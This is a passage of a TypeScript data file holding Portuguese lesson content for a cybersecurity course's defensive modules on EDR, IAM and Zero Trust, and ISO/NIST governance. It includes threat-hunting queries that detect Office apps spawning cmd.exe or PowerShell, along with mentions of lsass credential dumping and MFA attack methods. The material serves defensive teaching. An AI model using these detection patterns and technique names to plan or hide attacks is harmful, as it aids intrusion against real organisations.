    ],
  },
  {
    id: "mod-12",
    number: 12,
    title: "Segurança de Endpoints",
    description: "EDR vs antivírus, telemetria, detecção comportamental e hardening.",
    track: "defensive",
    labTitle: "Detecção de Ameaças em Endpoints",
    labDescription: "Analise telemetria de endpoint e identifique comportamento malicioso.",
    lessons: [
      { title: "EDR vs Antivírus Tradicional", content: "**Antivírus tradicional:**\n- Detecção baseada em assinaturas\n- Scanning de arquivos\n- Proteção reativa\n- Base de dados de malware conhecidos\n\n**EDR (Endpoint Detection & Response):**\n- Monitoramento contínuo de comportamento\n- Telemetria detalhada de processos\n- Detecção de ameaças avançadas (fileless, LOLBins)\n- Capacidade de resposta remota\n- Hunting e investigação\n\n**Soluções populares:** CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne, Carbon Black" },
      { title: "Telemetria de Endpoint", content: "EDR coleta dados detalhados sobre atividade do endpoint:\n\n**Eventos monitorados:**\n- Criação e término de processos\n- Conexões de rede\n- Modificações de arquivo\n- Alterações no Registry\n- Carregamento de DLLs\n- Scripts executados\n\n**Detecções comportamentais:**\n- Process injection\n- Credential dumping (lsass.exe access)\n- Lateral movement\n- Data exfiltration\n- Persistence mechanisms" },
      { title: "Detecção Comportamental", content: "Identificar ameaças pelo comportamento, não pela assinatura:\n\n**Exemplos de comportamento suspeito:**\n- Word.exe executando PowerShell\n- svchost.exe em localização incomum\n- Conexões para IPs em países incomuns\n- Grande volume de dados compactados\n- Acesso massivo a arquivos sensíveis\n\n**MITRE ATT&CK Mapping:**\nCada comportamento mapeia para técnicas específicas:\n- T1055: Process Injection\n- T1003: Credential Dumping\n- T1059: Command & Scripting Interpreter" },
      { title: "Hardening de Endpoints", content: "Fortalecer endpoints contra ataques:\n\n**Windows:**\n- Desabilitar macros no Office\n- Ativar AMSI (Anti-Malware Scan Interface)\n- Configurar AppLocker/WDAC\n- Ativar Credential Guard\n- Remover software desnecessário\n\n**Linux:**\n- SELinux/AppArmor\n- Desabilitar serviços desnecessários\n- Configurar auditd\n- Hardening SSH\n- Kernel security modules\n\n**Geral:** Patches atualizados, MFA, princípio do menor privilégio" },
      { title: "Threat Hunting em Endpoints", content: "Busca proativa por ameaças que escaparam da detecção automatizada:\n\n**Abordagens:**\n- **Hypothesis-driven:** Baseada em intelligence e ATT&CK\n- **IOC-based:** Busca por indicadores específicos\n- **Anomaly-based:** Identificar comportamentos fora do padrão\n\n**Queries de hunting:**\n```\n# Processos filhos suspeitos\nparent_process:\"excel.exe\" AND process:(\"cmd.exe\" OR \"powershell.exe\")\n\n# Conexões de rede incomuns\nprocess:\"svchost.exe\" AND dst_port NOT IN (80, 443, 53)\n```" },
    ],
  },
  {
    id: "mod-13",
    number: 13,
    title: "Identidade e Segurança Cloud",
    description: "IAM, MFA, Zero Trust e políticas de acesso.",
    track: "defensive",
    labTitle: "Detecção de Escalação de Privilégios",
    labDescription: "Detecte tentativas de escalação de privilégios em um cenário IAM simulado.",
    lessons: [
      { title: "IAM — Gerenciamento de Identidade", content: "IAM controla quem pode acessar o quê:\n\n**Componentes:**\n- **Identificação:** Quem é o usuário (username, email)\n- **Autenticação:** Provar identidade (senha, MFA, biometria)\n- **Autorização:** O que pode fazer (roles, permissions)\n- **Auditoria:** Registrar o que fez\n\n**Modelos de controle de acesso:**\n- RBAC (Role-Based): Acesso por cargo/função\n- ABAC (Attribute-Based): Acesso por atributos contextuais\n- MAC (Mandatory): Classificação de segurança\n- DAC (Discretionary): Proprietário define acesso" },
      { title: "MFA — Autenticação Multifator", content: "MFA combina múltiplos fatores de autenticação:\n\n**Fatores:**\n- **Algo que sabe:** Senha, PIN\n- **Algo que tem:** Token, smartphone, smart card\n- **Algo que é:** Biometria (digital, facial, íris)\n\n**Métodos:**\n- TOTP (Google Authenticator, Authy)\n- Push notifications\n- Hardware tokens (YubiKey)\n- SMS (menos seguro — SIM swap)\n\n**Ataques contra MFA:** Phishing de token em tempo real, MFA fatigue (bombardeio de push), bypass via session hijacking" },
      { title: "Zero Trust", content: "\"Nunca confie, sempre verifique\" — modelo de segurança moderno:\n\n**Princípios:**\n- Verificar explicitamente cada acesso\n- Acesso com menor privilégio\n- Assumir comprometimento\n- Microsegmentação de rede\n- Monitoramento contínuo\n\n**Implementação:**\n- Identity-aware proxy\n- Device posture checking\n- Continuous authentication\n- Encrypted communications\n- Dynamic access policies\n\nNão é um produto, é uma arquitetura e filosofia." },
      { title: "Políticas de Acesso Cloud", content: "Gerenciar acesso em ambientes cloud:\n\n**AWS IAM Policies:**\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"s3:GetObject\",\n  \"Resource\": \"arn:aws:s3:::bucket/*\",\n  \"Condition\": {\"IpAddress\": {\"aws:SourceIp\": \"10.0.0.0/8\"}}\n}\n```\n\n**Best practices:**\n- Usar roles ao invés de access keys\n- Políticas com menor privilégio\n- Service Control Policies (SCPs)\n- Rotação automática de credenciais\n- CloudTrail para auditoria" },
      { title: "Detecção de Abusos de Identidade", content: "Monitorar e detectar uso malicioso de credenciais:\n\n**Indicadores de comprometimento de identidade:**\n- Login de localização impossível\n- Múltiplas falhas de autenticação\n- Acesso fora de horário normal\n- Criação de novos admins\n- Desativação de logs/monitoramento\n\n**Ferramentas:**\n- Azure AD Identity Protection\n- AWS GuardDuty\n- Google Cloud Security Command Center\n\n**UEBA (User Entity Behavior Analytics):** Detecta anomalias comportamentais usando ML." },
    ],
  },
  {
    id: "mod-14",
    number: 14,
    title: "Governança e Resiliência Cibernética",
    description: "ISO 27001, NIST, gestão de risco, continuidade de negócios e DR.",
    track: "defensive",
    labTitle: "Simulador de Matriz de Risco",
    labDescription: "Construa uma matriz de risco para um cenário organizacional.",
    lessons: [
      { title: "ISO 27001", content: "A ISO 27001 é o padrão internacional para gestão de segurança da informação:\n\n**Estrutura:**\n- Contexto da organização\n- Liderança e comprometimento\n- Planejamento (avaliação de riscos)\n- Suporte (recursos, competência)\n- Operação (tratamento de riscos)\n- Avaliação de desempenho\n- Melhoria contínua\n\n**Anexo A:** 93 controles organizados em 4 categorias:\n- Organizacionais (37)\n- Pessoas (8)\n- Físicos (14)\n- Tecnológicos (34)\n\nA certificação ISO 27001 é reconhecida globalmente." },
      { title: "NIST Cybersecurity Framework", content: "O NIST CSF organiza segurança em 5 funções:\n\n1. **Identify (Identificar):** Inventário de ativos, avaliação de riscos\n2. **Protect (Proteger):** Controles de acesso, treinamento, dados\n3. **Detect (Detectar):** Monitoramento, detecção de anomalias\n4. **Respond (Responder):** Plano de resposta, comunicação\n5. **Recover (Recuperar):** Restauração, melhorias\n\nCada função contém categorias e subcategorias com referências a outros frameworks.\n\nO NIST CSF 2.0 (2024) adicionou a função **Govern (Governar)** como fundação." },
      { title: "Gestão de Riscos", content: "Processo sistemático de identificar, avaliar e tratar riscos:\n\n**Etapas:**\n1. **Identificação:** Listar ativos, ameaças e vulnerabilidades\n2. **Análise:** Estimar probabilidade e impacto\n3. **Avaliação:** Priorizar riscos\n4. **Tratamento:** Mitigar, transferir, aceitar ou evitar\n5. **Monitoramento:** Acompanhar riscos continuamente\n\n**Matriz de risco:**\n```\n           Impacto\n          B  M  A  C\nProb. A | M  A  C  C\nProb. M | B  M  A  C\nProb. B | B  B  M  A\n```" },
      { title: "Continuidade de Negócios", content: "Garantir operação mesmo durante incidentes:\n\n**BIA (Business Impact Analysis):**\n- Identificar processos críticos\n- Definir RTO (Recovery Time Objective)\n- Definir RPO (Recovery Point Objective)\n- Determinar impacto de interrupções\n\n**Plano de Continuidade (BCP):**\n- Procedimentos de emergência\n- Comunicação de crise\n- Locais alternativos\n- Fornecedores backup\n\n**Testes:** Tabletop, walkthrough, simulação parcial, teste completo" },
      { title: "Disaster Recovery", content: "Plano para recuperação após desastre:\n\n**Estratégias:**\n- **Hot site:** Pronto imediatamente (caro)\n- **Warm site:** Parcialmente configurado\n- **Cold site:** Espaço físico apenas\n- **Cloud DR:** Infraestrutura sob demanda\n\n**Elementos do plano:**\n- Inventário de sistemas críticos\n- Prioridade de recuperação\n- Procedimentos detalhados\n- Contatos de emergência\n- Testes regulares\n\n**Regra 3-2-1 de backup:** 3 cópias, 2 mídias diferentes, 1 offsite" },
    ],
  },
];

export function getModulesByTrack(track: "common" | "offensive" | "defensive"): CyberModule[] {
  return modules.filter((m) => m.track === track);
}
